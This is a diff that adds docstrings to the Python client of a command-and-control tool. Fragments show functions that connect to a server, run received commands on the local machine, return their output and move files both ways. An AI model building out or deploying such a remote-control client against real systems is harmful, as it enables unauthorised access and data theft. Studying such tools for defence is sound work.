@@ -22,6 +22,14 @@ DOWNLOADS = pathlib.Path(__file__).parent
 
 
 def get_file_hash(data: list[bytes]) -> str:
+    """
+    Calculates a file md5 hash.
+
+    :param data: File content split into segments
+    :type data: list[bytes]
+    :return: Md5 hash of the file
+    :rtype: str
+    """
     md5 = hashlib.md5()
     for chunk in data:
         md5.update(chunk)
@@ -29,6 +37,15 @@ def get_file_hash(data: list[bytes]) -> str:
 
 
 def upload_file(sock: socket.socket, path: str) -> None:
+    """
+    Uploads file from clietn to server.
+
+    :param sock: Server socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param path: Target file path
+    :type path: str
+    :return: None
+    """
     # Implemented segmentation when reading / sending file data to avoid memory overload
     path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
     try:
@@ -54,6 +71,15 @@ def upload_file(sock: socket.socket, path: str) -> None:
 
 
 def download_file(sock: socket.socket, path: str) -> None:
+    """
+    Downloads file from server to client.
+
+    :param sock: Server socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param path: Target file path
+    :type path: str
+    :return: None
+    """
     # Implemented segmentation when writing / receiving file data to avoid memory overload
     file_name = pathlib.Path(path).name  # File name without the full path
     dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
@@ -101,10 +127,13 @@ def download_file(sock: socket.socket, path: str) -> None:
 
 
 def run_msg(msg: str) -> str:
-    """This function runs messages received from the server as bash commands on the local system.
+    """
+    Runs messages received from the server as commands on the local system.
 
-    :param msg: Message from the server in clear text
-    :return: Bash command output
+    :param msg: Message from the server
+    :type msg: str
+    :return: Command output
+    :rtype: str
     """
     # Command execution attempt
     try:
@@ -116,12 +145,12 @@ def run_msg(msg: str) -> str:
 
 
 def send_output(sock: socket.socket, msg: str) -> None:
-    """This function receives a message, runs it as a bash command on the local system,
-    and sends its output back to the server.
+    """
+    Runs received commands on the local system, and sends the output back to the server.
 
-    :param sock: Socket established with the server
-    :param msg: Bash command to run
-    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param sock: Server socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param msg: Command to run
     :type msg: str
     :return: None
     """
@@ -144,11 +173,12 @@ def send_output(sock: socket.socket, msg: str) -> None:
 
 
 def recv_msg(sock: socket.socket) -> str:
-    """This function receives bash commands from the server.
+    """
+    Receives encoded commands from the server and returns them decoded.
 
-    :param sock: Socket established with the server
+    :param sock: Server socket object
     :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
-    :return: Bash commands from the server in clear text
+    :return: Decoded commands from the server
     :rtype: str
     """
     try:
@@ -161,7 +191,13 @@ def recv_msg(sock: socket.socket) -> str:
 
 
 def shell(sock: socket.socket) -> None:
-    # Command line interface
+    """
+    Received commands from the server and executes the appropriate action.
+
+    :param sock: Server socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :return: None
+    """
     orig = sock.gettimeout()
     sock.settimeout(COMMAND_TIMEOUT)
     while sock:
@@ -186,6 +222,14 @@ def shell(sock: socket.socket) -> None:
 
 
 def establish_connection(sock: socket.socket, consecutive_connections: int) -> int:
+    """
+    Connects to a listening server socket.
+
+    :param sock: Local system socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :return: Number of consecutive connection attempts
+    :rtype: int
+    """
     # Connection attempt to server side
     try:
         sock.connect((SERVER_IP, PORT))
@@ -210,7 +254,8 @@ def establish_connection(sock: socket.socket, consecutive_connections: int) -> i
 
 
 def main() -> None:
-    """This is the main function for the C&C client side.
+    """
+    Main function for the C&C client side.
 
     :return: None
     """
